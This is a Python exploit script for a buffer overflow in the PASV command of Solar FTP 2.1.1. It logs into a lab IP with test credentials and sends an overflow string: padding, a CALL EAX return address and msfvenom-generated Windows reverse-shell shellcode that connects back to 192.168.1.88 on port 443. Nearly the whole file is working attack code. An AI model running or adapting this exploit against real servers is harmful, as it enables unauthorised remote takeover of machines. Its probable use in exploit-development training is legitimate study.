#!/usr/bin/env python
# Author: Xavi Beltran
# Date: 27/07/2019
# Description:
#           PASV FTP function Buffer Overflow
#		    	Solar FTP 2.1.1
import socket
import os
import sys

s = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
s.connect(("192.168.1.99", 21))
response = s.recv(1024)
print(response)

s.send("USER test\r\n")
response = s.recv(1024)
print(response)

s.send("PASS test\r\n")
response = s.recv(1024)
print(response)

# [*] Exact match at offset 123
junk1 = "\x41"* 10 + "\x90" * 113

# 0x10011b25 - CALL EAX
eip = "\x25\x1b\x01\x10"

padding = "\x90" * 9

# msfvenom -p windows/shell_reverse_tcp LPORT=443 LHOST=192.168.1.88 -b "\x00"-f python -v shellcode
# Payload size: 351 bytes
shellcode =  ""
shellcode += "\xd9\xc0\xbe\x7e\x60\x98\x2c\xd9\x74\x24\xf4\x5d"
shellcode += "\x33\xc9\xb1\x52\x31\x75\x17\x03\x75\x17\x83\x93"
shellcode += "\x9c\x7a\xd9\x97\xb5\xf9\x22\x67\x46\x9e\xab\x82"
shellcode += "\x77\x9e\xc8\xc7\x28\x2e\x9a\x85\xc4\xc5\xce\x3d"
shellcode += "\x5e\xab\xc6\x32\xd7\x06\x31\x7d\xe8\x3b\x01\x1c"
shellcode += "\x6a\x46\x56\xfe\x53\x89\xab\xff\x94\xf4\x46\xad"
shellcode += "\x4d\x72\xf4\x41\xf9\xce\xc5\xea\xb1\xdf\x4d\x0f"
shellcode += "\x01\xe1\x7c\x9e\x19\xb8\x5e\x21\xcd\xb0\xd6\x39"
shellcode += "\x12\xfc\xa1\xb2\xe0\x8a\x33\x12\x39\x72\x9f\x5b"
shellcode += "\xf5\x81\xe1\x9c\x32\x7a\x94\xd4\x40\x07\xaf\x23"
shellcode += "\x3a\xd3\x3a\xb7\x9c\x90\x9d\x13\x1c\x74\x7b\xd0"
shellcode += "\x12\x31\x0f\xbe\x36\xc4\xdc\xb5\x43\x4d\xe3\x19"
shellcode += "\xc2\x15\xc0\xbd\x8e\xce\x69\xe4\x6a\xa0\x96\xf6"
shellcode += "\xd4\x1d\x33\x7d\xf8\x4a\x4e\xdc\x95\xbf\x63\xde"
shellcode += "\x65\xa8\xf4\xad\x57\x77\xaf\x39\xd4\xf0\x69\xbe"
shellcode += "\x1b\x2b\xcd\x50\xe2\xd4\x2e\x79\x21\x80\x7e\x11"
shellcode += "\x80\xa9\x14\xe1\x2d\x7c\xba\xb1\x81\x2f\x7b\x61"
shellcode += "\x62\x80\x13\x6b\x6d\xff\x04\x94\xa7\x68\xae\x6f"
shellcode += "\x20\x57\x87\x6e\xe8\x3f\xda\x70\x09\x7b\x53\x96"
shellcode += "\x63\x6b\x32\x01\x1c\x12\x1f\xd9\xbd\xdb\xb5\xa4"
shellcode += "\xfe\x50\x3a\x59\xb0\x90\x37\x49\x25\x51\x02\x33"
shellcode += "\xe0\x6e\xb8\x5b\x6e\xfc\x27\x9b\xf9\x1d\xf0\xcc"
shellcode += "\xae\xd0\x09\x98\x42\x4a\xa0\xbe\x9e\x0a\x8b\x7a"
shellcode += "\x45\xef\x12\x83\x08\x4b\x31\x93\xd4\x54\x7d\xc7"
shellcode += "\x88\x02\x2b\xb1\x6e\xfd\x9d\x6b\x39\x52\x74\xfb"
shellcode += "\xbc\x98\x47\x7d\xc1\xf4\x31\x61\x70\xa1\x07\x9e"
shellcode += "\xbd\x25\x80\xe7\xa3\xd5\x6f\x32\x60\xe5\x25\x1e"
shellcode += "\xc1\x6e\xe0\xcb\x53\xf3\x13\x26\x97\x0a\x90\xc2"
shellcode += "\x68\xe9\x88\xa7\x6d\xb5\x0e\x54\x1c\xa6\xfa\x5a"
shellcode += "\xb3\xc7\x2e"

# 2500 - 4 - 123 -360
junk2 = "\x90" * 2013

crash = junk1 + eip + padding + shellcode + junk2 

s.send("PASV " + crash + "\r\n")
response = s.recv(1024)
print(response)

s.close()
